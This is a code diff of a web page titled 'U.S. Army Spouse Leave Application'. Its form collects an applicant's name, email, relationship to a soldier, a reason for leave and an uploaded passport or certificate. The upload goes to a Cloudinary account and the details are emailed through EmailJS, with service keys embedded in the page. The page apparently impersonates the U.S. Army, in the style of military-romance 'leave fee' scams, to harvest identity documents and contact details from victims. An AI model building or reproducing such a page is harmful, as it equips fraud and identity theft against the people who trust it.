@@ -4,127 +4,92 @@
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
   <title>U.S. Army Spouse Leave Application</title>
-  <link href="https://cdn.jsdelivr.net/npm/tailwindcss@2.2.19/dist/tailwind.min.css" rel="stylesheet">
   <script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
-  <script>
-    emailjs.init("gemkywkuPgyAvxdHD");
-  </script>
   <style>
-    body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; }
-    .army-gold { background-color: #ffcc00; color: #1a1a1a; }
-    .army-gold-text { color: #ffcc00; }
-    .border-army { border-color: #ffcc00; }
-    .spinner {
-      border: 4px solid rgba(0, 0, 0, 0.1);
-      border-left-color: #000;
-      border-radius: 50%;
-      width: 24px;
-      height: 24px;
-      animation: spin 1s linear infinite;
-      display: inline-block;
-    }
-    @keyframes spin {
-      to { transform: rotate(360deg); }
-    }
+    body { font-family: 'Segoe UI', sans-serif; background: #f0f2f5; margin: 0; padding: 0; }
+    .container { max-width: 600px; margin: 50px auto; background: white; padding: 30px; border-radius: 8px; box-shadow: 0 0 10px rgba(0,0,0,0.1); }
+    h2 { color: #011a44; text-align: center; }
+    input, textarea, select { width: 100%; padding: 12px; margin: 10px 0; border: 1px solid #ccc; border-radius: 4px; }
+    button { background: #011a44; color: white; padding: 12px 20px; border: none; border-radius: 4px; cursor: pointer; font-size: 16px; }
+    #toast { position: fixed; bottom: 20px; right: 20px; background: #011a44; color: white; padding: 12px 20px; border-radius: 5px; display: none; z-index: 1000; }
   </style>
 </head>
-<body class="bg-gray-100 text-gray-800">
-  <!-- header and other content stay the same -->
+<body>
+  <div class="container">
+    <h2>Army Spouse Leave Application</h2>
+    <form id="leaveForm">
+      <input type="text" id="name" name="name" placeholder="Your Full Name" required />
+      <input type="email" id="email" name="email" placeholder="Your Email Address" required />
+      <input type="text" id="rank" name="rank" placeholder="Soldier's Name & Rank" required />
+      <select id="relationship" name="relationship" required>
+        <option value="">Select Relationship</option>
+        <option value="Spouse">Spouse</option>
+        <option value="Fiancé(e)">Fiancé(e)</option>
+        <option value="Partner">Partner</option>
+      </select>
+      <textarea id="reason" name="reason" placeholder="Reason for Leave Request" rows="4" required></textarea>
+      <label><strong>Upload Passport or Certificate</strong></label>
+      <input type="file" id="document" name="document" accept=".jpg,.png,.pdf,.doc,.docx" required />
+      <button type="submit" id="submitBtn">Submit Application</button>
+    </form>
+  </div>
 
-  <main class="max-w-4xl mx-auto px-4">
-    <!-- Your intro/hero content remains the same -->
-
-    <!-- Application Form -->
-    <section id="application" class="mt-16 bg-white p-8 rounded-2xl shadow-md">
-      <h2 class="text-2xl font-bold mb-6">Leave Application Form</h2>
-      <form id="leaveForm" class="grid gap-4">
-        <label>Full Name
-          <input name="name" class="mt-1 p-3 w-full border border-army rounded-lg" type="text" required />
-        </label>
-        <label>Email Address
-          <input name="email" class="mt-1 p-3 w-full border border-army rounded-lg" type="email" required />
-        </label>
-        <label>Soldier’s Full Name & Rank
-          <input name="rank" class="mt-1 p-3 w-full border border-army rounded-lg" type="text" required />
-        </label>
-        <label>Relationship Type
-          <select name="relationship" class="mt-1 p-3 w-full border border-army rounded-lg" required>
-            <option value="Married">Married</option>
-            <option value="Dating">Dating</option>
-            <option value="Fiancé(e)">Fiancé(e)</option>
-          </select>
-        </label>
-        <label>Reason for Leave
-          <textarea name="reason" class="mt-1 p-3 w-full border border-army rounded-lg" rows="4" required></textarea>
-        </label>
-        <label>Upload Supporting Documents
-          <input id="docs" name="docs" class="mt-1 p-3 w-full border border-army rounded-lg" type="file" accept=".pdf,.jpg,.png" required />
-        </label>
-        <button type="submit" id="submitBtn" class="bg-black text-white font-semibold py-3 px-6 rounded-lg hover:bg-gray-900 transition">Submit Request</button>
-        <p id="feedback" class="mt-4 text-center text-green-600 font-medium hidden"></p>
-      </form>
-    </section>
-  </main>
+  <div id="toast"></div>
 
   <script>
-    const form = document.getElementById('leaveForm');
-    const submitBtn = document.getElementById('submitBtn');
-    const feedback = document.getElementById('feedback');
+    function showToast(message, isError = false) {
+      const toast = document.getElementById("toast");
+      toast.style.backgroundColor = isError ? "#c0392b" : "#011a44";
+      toast.textContent = message;
+      toast.style.display = "block";
+      setTimeout(() => { toast.style.display = "none"; }, 3000);
+    }
 
-    form.addEventListener('submit', async (e) => {
+    (function() {
+      emailjs.init("gemkywkuPgyAvxdHD");
+    })();
+
+    document.getElementById("leaveForm").addEventListener("submit", async function(e) {
       e.preventDefault();
-      submitBtn.disabled = true;
-      submitBtn.innerHTML = '<span class="spinner"></span> Submitting...';
-      feedback.classList.add('hidden');
+      const btn = document.getElementById("submitBtn");
+      btn.disabled = true;
+      btn.textContent = "Uploading...";
 
-      const formData = new FormData(form);
-      const file = document.getElementById('docs').files[0];
+      const fileInput = document.getElementById("document");
+      const file = fileInput.files[0];
+      const formData = new FormData();
+      formData.append("file", file);
+      formData.append("upload_preset", "unsigned_preset");
 
       try {
-        const cloudData = new FormData();
-        cloudData.append('file', file);
-        cloudData.append('upload_preset', 'unsigned_preset');
-
-        const cloudRes = await fetch('https://api.cloudinary.com/v1_1/do9yjpizs/auto/upload', {
-          method: 'POST',
-          body: cloudData
+        const uploadRes = await fetch("https://api.cloudinary.com/v1_1/do9yjpizs/auto/upload", {
+          method: "POST",
+          body: formData,
         });
 
-        const cloudResult = await cloudRes.json();
-        const fileUrl = cloudResult.secure_url;
+        const uploadData = await uploadRes.json();
+        const documentUrl = uploadData.secure_url;
 
-        const name = formData.get('name');
-        const email = formData.get('email');
-        const rank = formData.get('rank');
-        const relationship = formData.get('relationship');
-        const reason = formData.get('reason');
-
-        const templateParamsTeam = {
-          name, email, rank, relationship, reason,
-          document_url: fileUrl
+        const templateParams = {
+          name: document.getElementById("name").value,
+          email: document.getElementById("email").value,
+          rank: document.getElementById("rank").value,
+          relationship: document.getElementById("relationship").value,
+          reason: document.getElementById("reason").value,
+          document_url: documentUrl,
         };
 
-        const templateParamsApplicant = {
-          name,
-          rank,
-          to_email: email
-        };
+        await emailjs.send("service_il4m6rr", "template_0moxpwa", templateParams);
+        await emailjs.send("service_il4m6rr", "template_3tmdj1g", templateParams);
 
-        await emailjs.send('service_il4m6rr', 'template_0moxpwa', templateParamsTeam);
-        await emailjs.send('service_il4m6rr', 'template_3tmdj1g', templateParamsApplicant);
-
-        feedback.textContent = 'Application submitted successfully! Please check your email for confirmation.';
-        feedback.classList.remove('hidden');
-        form.reset();
+        showToast("Application submitted successfully!");
+        this.reset();
       } catch (err) {
-        console.error('Submission error:', err);
-        feedback.textContent = 'Something went wrong. Please try again later.';
-        feedback.classList.remove('text-green-600');
-        feedback.classList.add('text-red-600');
-        feedback.classList.remove('hidden');
+        console.error(err);
+        showToast("Submission failed. Please try again.", true);
       } finally {
-        submitBtn.disabled = false;
-        submitBtn.innerHTML = 'Submit Request';
+        btn.disabled = false;
+        btn.textContent = "Submit Application";
       }
     });
   </script>
